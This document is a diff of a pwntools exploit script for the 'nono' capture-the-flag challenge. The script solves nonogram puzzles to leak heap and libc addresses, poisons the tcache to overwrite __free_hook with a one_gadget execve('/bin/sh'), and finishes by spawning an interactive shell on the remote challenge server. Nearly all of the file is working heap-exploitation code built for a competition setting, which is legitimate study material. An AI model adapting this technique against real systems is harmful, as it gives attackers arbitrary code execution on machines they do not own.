@@ -4,12 +4,15 @@ from pwn import *
 from nono import Nonogram
 from re import findall
 
+exe = ELF('nono', checksec=False)
+libc = ELF('libc.so.6', checksec=False)
+ld = ELF('ld.so', checksec=False)
+
+context.binary = exe
 context.terminal = 'tmux split -h'.split(' ')
 context.arch = 'amd64'
-context.timeout = 60
 # context.log_level = 'debug'
 
-elf = ELF('nono', checksec=False)
 
 """
 0xe6ce3 execve("/bin/sh", r10, r12)
@@ -33,15 +36,15 @@ constraints:
 0x7f1ed192bafb <__execvpe+651>:      call   0x7f1ed192b160 <execve>
 """
 
-libc = elf.libc
 og_off = 0xe6af1
 
-for _ in range(20):
+for _ in range(20): # Loops to address puzzles with more than one solution. If the script does not find the expected one, the program will exit after failure!
     try:
         if args.REMOTE:
             p = remote('pwn03.chal.ctf.westerns.tokyo', 22915)
         else:
-            p = process(elf.path)
+            p = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
+            # p = process(exe.path)
 
             if args.GDB:
                 gdb.attach(p, '''
@@ -61,7 +64,7 @@ for _ in range(20):
 
         def solve_nono(size, rows, columns):
             base = len(columns)-3
-            nonogram = Nonogram(columns[-3:-1], rows)
+            nonogram = Nonogram(columns[-3:], rows)
             solution = nonogram.solve()
 
             for r, row in enumerate(solution):
@@ -116,7 +119,7 @@ for _ in range(20):
         # print(solution)
         base = 89 * 92
         leaks = get_leaks(base, solution, 92)
-        print(len(leaks))
+        # print(len(leaks))
 
         vector_begin = u64(leaks[:8])
         vector_end = u64(leaks[8:16])
@@ -129,7 +132,7 @@ for _ in range(20):
         log.info(f'big_chunk @ {hex(big_chunk)}')
 
         break
-    except:
+    except Exception as e:
         p.close()
 
 # 3. Make room for new puzzles on vector
@@ -181,8 +184,9 @@ p.sendlineafter(b'Index:\n', b'0')
 # 5. Rearrange heap
 
 add(b'F' * 0x4, 92, b'\x00')
-delete(0)
-delete(0)
+
+delete(0) # Free big_chunk_t
+delete(0) # Free big_chunk
 
 big_chunk_t = big_chunk+0x4e0
 
@@ -211,7 +215,6 @@ log.info(f'system @ {hex(libc.sym.system)}')
 log.info(f'og @ {hex(og_addr)}')
 
 # addr: big_chunk + 0x10
-# fake_cont_three = p64(0) + p64(0x21) + p64(libc.sym.__realloc_hook) + p64(tcache_safe)
 fake_cont_three = p64(0) + p64(0x21) + p64(libc.sym.__free_hook) + p64(tcache_safe)
 # addr: big_chunk + 0x30
 fake_vec_table = p64(0) + p64(0x31) + p64(0)
@@ -235,5 +238,4 @@ add(b'K' * 0x4, 92, content)
 
 delete(0)
 
-# quit()
 p.interactive()
